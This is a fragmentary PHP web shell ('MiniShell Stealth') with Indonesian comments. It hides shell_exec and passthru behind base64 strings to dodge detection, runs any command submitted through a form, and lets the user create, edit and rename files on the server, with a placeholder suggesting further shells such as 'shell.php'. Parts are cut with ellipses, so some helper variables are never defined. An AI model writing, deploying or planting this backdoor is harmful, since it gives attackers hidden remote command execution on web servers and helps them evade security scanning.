<?php
// PHP MiniShell - Versi Obfuscated dengan CMD (Tanpa Upload)
...
$f_sh = base64_decode('c2hlbGxfZXhlYw=='); // shell_exec
$f_ps = base64_decode('cGFzc3RocnU=');      // passthru

$f_sess();

// Fungsi eksekusi perintah yang disandikan
function execute_cmd($cmd) {
    global $f_sh, $f_ps;
    if (function_exists($f_sh)) {
        return htmlspecialchars(@$f_sh($cmd));
    } elseif (function_exists($f_ps)) {
        ob_start();
        @$f_ps($cmd);
        $output = ob_get_clean();
        return htmlspecialchars($output);
    } else {
        return "ERROR: Command execution functions (shell_exec/passthru) are blocked.";
    }
}
...
echo "<html><body><h1>MiniShell Stealth (File Creation)</h1>";
...
if (isset($_POST['cmd'])) { // Eksekusi CMD
    $cmd_output = execute_cmd($_POST['cmd']);
    ...
    if ($_POST['a'] === 'edit_save') { // Buat/Edit File
        if (@$f_put($file, $content) !== false) {
            $msg = "Saved/Created: " . $file;
        } else {
            $msg = "Save/Creation failed: " . $file;
        }
    } elseif ($_POST['a'] === 'rename') { // Ganti Nama
        if (@$f_ren($file, $new_name)) {
            $msg = "Renamed: " . $file . " to " . $new_name;
        } else {
            $msg = "Rename failed.";
        }
...
// --- TAMPILAN CMD OUTPUT ---
if ($cmd_output) {
    echo "<h3>[CMD OUTPUT]</h3><pre>" . $cmd_output . "</pre>";
}


// --- FORMULIR UNTUK AKSI ---
echo "<h3>CMD EXECUTION</h3>";
echo "<form method='POST'><input type='text' name='cmd' placeholder='Enter command'><input type='submit' value='Execute'></form><br>";

echo "<h3>FILE ACTIONS</h3>";

// Buat File Baru (Fokus Utama)
echo "<h4>1. Create New File</h4>";
echo "<form method='POST'><input type='hidden' name='a' value='edit_save'><input type='text' name='f' placeholder='New File Name (e.g., shell.php)'><br><textarea name='c' rows='10' cols='80' placeholder='File Content'></textarea><br><input type='submit' value='Create/Save File'></form><br>";
...
// --- FORM EDIT/CREATE (Saat Link EDIT diklik) ---
if (isset($_GET['f'])) {
    $file_to_edit = $_GET['f'];
